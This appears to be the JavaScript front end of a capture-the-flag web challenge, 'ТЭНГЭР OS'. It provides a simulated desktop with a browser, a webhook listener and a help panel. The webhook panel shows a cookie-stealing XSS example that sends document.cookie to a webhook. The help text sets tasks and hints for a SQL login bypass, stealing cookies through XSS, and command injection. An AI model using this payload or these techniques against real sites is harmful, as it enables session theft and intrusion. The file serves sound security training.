/* ТЭНГЭР OS — Desktop */
(function(){
var SID=null,wins={},zTop=100,posOff=0;

/* ═══ Session ═══ */
function initSession(){
  return new Promise(function(resolve){
    SID=localStorage.getItem('tng_sid');
    var check=SID?fetch('/challenge/home?sid='+SID).then(function(r){if(!r.ok)SID=null;}):Promise.resolve();
    check.catch(function(){SID=null;}).then(function(){
      if(!SID){
        return fetch('/api/session',{method:'POST'}).then(function(r){return r.json();}).then(function(d){
          SID=d.sid;localStorage.setItem('tng_sid',SID);
        });
      }
    }).then(function(){
      var el=document.getElementById('tb-session');
      if(el)el.textContent=SID.substring(0,8)+'...';
      resolve();
    });
  });
}

/* ═══ Boot ═══ */
function boot(){
  var fill=document.getElementById('boot-fill');
  var status=document.getElementById('boot-status');
  var steps=[[10,'Loading kernel...'],[25,'Mounting filesystems...'],[40,'Starting KHAAN-WALL firewall...'],[55,'Connecting to database...'],[70,'Initializing session...'],[85,'Loading desktop environment...'],[100,'Ready.']];
  var i=0;
  function next(){
    if(i>=steps.length){
      initSession().then(function(){
        fill.style.width='100%';
        status.textContent='Welcome to ТЭНГЭР OS';
        setTimeout(function(){
          document.getElementById('boot').classList.add('gone');
          document.getElementById('desktop').classList.remove('hidden');
          document.getElementById('taskbar').classList.remove('hidden');
          startClock();
        },600);
      });
      return;
    }
    fill.style.width=steps[i][0]+'%';
    status.textContent=steps[i][1];
    i++;
    setTimeout(next,300+Math.random()*400);
  }
  next();
}

function startClock(){
  var el=document.getElementById('tb-clock');
  function t(){el.textContent=new Date().toLocaleTimeString();}
  t();setInterval(t,1000);
}

/* ═══ Window Manager ═══ */
function createWin(id,title,bodyHTML,opts){
  opts=opts||{};
  if(wins[id]){focusWin(id);return wins[id];}
  var w=opts.width||860,h=opts.height||520;
  var x=Math.min(60+posOff*30,window.innerWidth-w-20);
  var y=Math.min(40+posOff*30,window.innerHeight-h-80);
  posOff=(posOff+1)%8;

  var el=document.createElement('div');
  el.className='win focused';el.id='w-'+id;
  el.style.cssText='left:'+x+'px;top:'+y+'px;width:'+w+'px;height:'+h+'px;z-index:'+(++zTop);

  var bar=document.createElement('div');
  bar.className='win-bar';

  var btnC=document.createElement('span');btnC.className='win-btn btn-close';
  btnC.addEventListener('click',function(e){e.stopPropagation();closeWin(id);});
  var btnM=document.createElement('span');btnM.className='win-btn btn-min';
  btnM.addEventListener('click',function(e){e.stopPropagation();minWin(id);});
  var btnX=document.createElement('span');btnX.className='win-btn btn-max';
  var titleEl=document.createElement('span');titleEl.className='win-title';titleEl.textContent=title;

  bar.appendChild(btnC);bar.appendChild(btnM);bar.appendChild(btnX);bar.appendChild(titleEl);

  var body=document.createElement('div');
  body.className='win-body';body.innerHTML=bodyHTML;

  el.appendChild(bar);el.appendChild(body);
  document.getElementById('windows').appendChild(el);
  initDrag(el);
  el.addEventListener('mousedown',function(){focusWin(id);});

  var tb=document.createElement('div');
  tb.className='tb-item active';tb.id='tb-'+id;tb.textContent=title;
  tb.addEventListener('click',function(){
    if(el.classList.contains('hidden'))focusWin(id);
    else if(el.classList.contains('focused'))minWin(id);
    else focusWin(id);
  });
  document.getElementById('tb-apps').appendChild(tb);

  wins[id]={el:el,tb:tb,id:id,title:title};
  return wins[id];
}

function initDrag(el){
  var bar=el.querySelector('.win-bar');
  var dragging=false,sx,sy,ox,oy;
  bar.addEventListener('mousedown',function(e){
    if(e.target.classList.contains('win-btn'))return;
    dragging=true;sx=e.clientX;sy=e.clientY;ox=el.offsetLeft;oy=el.offsetTop;
    document.body.style.userSelect='none';
  });
  document.addEventListener('mousemove',function(e){
    if(!dragging)return;
    el.style.left=Math.max(0,ox+e.clientX-sx)+'px';
    el.style.top=Math.max(0,oy+e.clientY-sy)+'px';
  });
  document.addEventListener('mouseup',function(){dragging=false;document.body.style.userSelect='';});
}

function focusWin(id){
  var keys=Object.keys(wins);
  for(var k=0;k<keys.length;k++){wins[keys[k]].el.classList.remove('focused');wins[keys[k]].tb.classList.remove('active');}
  var w=wins[id];if(!w)return;
  w.el.classList.remove('hidden');w.el.classList.add('focused');w.el.style.zIndex=++zTop;
  w.tb.classList.add('active');
}
function minWin(id){var w=wins[id];if(!w)return;w.el.classList.add('hidden');w.tb.classList.remove('active');}
function closeWin(id){var w=wins[id];if(!w)return;w.el.remove();w.tb.remove();delete wins[id];if(w._sse)w._sse.close();}

/* ═══ Khan Browser ═══ */
function appBrowser(){
  var url='/challenge/home?sid='+SID;
  var h='<div class="br-bar">'+
    '<button class="br-nav" id="br-back">◀</button>'+
    '<button class="br-nav" id="br-fwd">▶</button>'+
    '<input class="br-url" id="br-url" value="'+url+'" spellcheck="false">'+
    '<button class="br-nav" id="br-go">↵</button>'+
    '<button class="br-nav" id="br-reload">⟳</button>'+
    '</div>'+
    '<iframe class="br-frame" id="br-frame" src="'+url+'" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>';
  createWin('browser','🌐 Khan Browser',h,{width:920,height:580});

  document.getElementById('br-back').addEventListener('click',function(){try{document.getElementById('br-frame').contentWindow.history.back();}catch(e){}});
  document.getElementById('br-fwd').addEventListener('click',function(){try{document.getElementById('br-frame').contentWindow.history.forward();}catch(e){}});
  document.getElementById('br-go').addEventListener('click',doNav);
  document.getElementById('br-reload').addEventListener('click',function(){
    var f=document.getElementById('br-frame');
    try{f.contentWindow.location.reload();}catch(e){f.src=f.src;}
  });
  document.getElementById('br-url').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();doNav();}});

  var frame=document.getElementById('br-frame');
  frame.addEventListener('load',function(){
    try{document.getElementById('br-url').value=frame.contentWindow.location.pathname+frame.contentWindow.location.search;}catch(e){}
  });

  function doNav(){
    var u=document.getElementById('br-url').value.trim();
    if(!u)return;
    if(u.startsWith('/challenge')&&u.indexOf('sid=')===-1)u+=(u.indexOf('?')!==-1?'&':'?')+'sid='+SID;
    document.getElementById('br-frame').src=u;
  }
}

/* ═══ Webhook Listener ═══ */
function appWebhook(){
  var hookUrl=location.origin+'/hook/'+SID;
  var h='<div style="padding:8px 12px">'+
    '<div style="color:#556;font-size:10px;margin-bottom:4px">YOUR WEBHOOK URL (click to copy):</div>'+
    '<div class="wh-url-box" id="wh-url">'+hookUrl+'</div>'+
    '<div class="wh-hint">Accepts any HTTP method. Query params &amp; body logged in real-time.<br>'+
    'Example: <code>&lt;script&gt;fetch("'+hookUrl+'?d="+document.cookie)&lt;/script&gt;</code></div>'+
    '</div>'+
    '<div class="wh-log" id="wh-log"><div style="color:#334;text-align:center;margin-top:30px">📡 Waiting for incoming requests...</div></div>';
  var w=createWin('webhook','📡 Webhook Listener',h,{width:620,height:420});

  document.getElementById('wh-url').addEventListener('click',function(){
    var el=document.getElementById('wh-url');
    navigator.clipboard.writeText(hookUrl).then(function(){
      el.style.borderColor='#2ec4b6';el.textContent='✓ Copied!';
      setTimeout(function(){el.textContent=hookUrl;el.style.borderColor='#00b4d8';},1200);
    });
  });

  var sse=new EventSource('/hook/'+SID+'/events');
  w._sse=sse;
  sse.onmessage=function(e){
    var d=JSON.parse(e.data);
    var log=document.getElementById('wh-log');
    if(!log){sse.close();return;}
    var ph=log.querySelector('div[style]');
    if(ph)log.innerHTML='';
    var qs=Object.entries(d.query||{}).map(function(kv){return kv[0]+'='+kv[1];}).join('&');
    var time=(d.time||'').split('T')[1];time=time?time.split('.')[0]:'';
    var div=document.createElement('div');div.className='wh-entry';
    div.innerHTML='<span class="wh-time">['+time+']</span> <span style="color:#8aa">'+d.method+'</span> '+(qs?'?'+qs:'')+
      (qs?'<div class="wh-data">'+decodeURIComponent(qs)+'</div>':'');
    log.appendChild(div);log.scrollTop=log.scrollHeight;
  };
}

/* ═══ Notes ═══ */
function appNotes(){
  var saved=localStorage.getItem('tng_notes')||'';
  var h='<textarea class="note-area" id="note-ta" placeholder="Scratchpad — jot down payloads, notes, tokens...">'+saved+'</textarea>';
  createWin('notes','📝 Notes',h,{width:520,height:380});
  document.getElementById('note-ta').addEventListener('input',function(){localStorage.setItem('tng_notes',this.value);});
}

/* ═══ Challenge Info ═══ */
function appHelp(){
  var h='<div class="help-body">'+
    '<h2>🏔 ТЭНГЭР OS — CTF Challenge</h2>'+
    '<p>This challenge has <strong>3 parts</strong>, each with a separate flag <code>HZU18{...}</code>.</p>'+
    '<h2>Part 1 — Login Bypass</h2>'+
    '<p>Open <strong>Khan Browser</strong> and navigate to the login page. '+
    'The KHAAN-WALL firewall filters your input. Check <em>System Status</em> for details. '+
    'Bypass the filter and log in as <code>admin</code>.</p>'+
    '<h2>Part 2 — Steal the Head Admin\'s Secret</h2>'+
    '<p>After login, you can send reports to the Head Admin. '+
    'The Head Admin opens your report in their browser — and carries classified secrets in their <strong>cookies</strong>. '+
    'Open the <strong>Webhook Listener</strong> app to get your personal webhook URL. '+
    'Find a way to make the Head Admin\'s browser send their cookies to your webhook.</p>'+
    '<h2>Part 3 — Network Diagnostics</h2>'+
    '<p>The admin dashboard has a Network Diagnostics tool. '+
    'The tool validates input client-side, but the server has its own (weaker) validation. '+
    'Find a way to execute more than just <code>ping</code>. '+
    'The flag is in <code>/app/flag3.txt</code>.</p>'+
    '<h2>Tools</h2>'+
    '<ul style="margin-left:20px;margin-top:5px">'+
    '<li><strong>🌐 Khan Browser</strong> — Browse the challenge</li>'+
    '<li><strong>📡 Webhook Listener</strong> — Personal webhook with live feed</li>'+
    '<li><strong>📝 Notes</strong> — Scratchpad</li></ul>'+
    '<h2 style="margin-top:20px">Hints</h2>'+
    '<ul style="margin-left:20px;margin-top:5px">'+
    '<li>Part 1: What comparison operators does SQLite support besides <code>=</code>?</li>'+
    '<li>Part 2: The HTML sanitizer uses regex. What happens with nested tags in a single pass?</li>'+
    '<li>Part 3: Client-side validation is not security. What characters does the server-side filter miss?</li></ul>'+
    '</div>';
  createWin('help','❓ Challenge Info',h,{width:660,height:520});
}

/* ═══ Icon click handler (event delegation) ═══ */
var appMap={browser:appBrowser,webhook:appWebhook,notes:appNotes,help:appHelp};
document.addEventListener('dblclick',function(e){
  var icon=e.target.closest('.icon[data-app]');
  if(!icon)return;
  var app=icon.getAttribute('data-app');
  if(appMap[app])appMap[app]();
});

/* ═══ Init ═══ */
boot();

})();
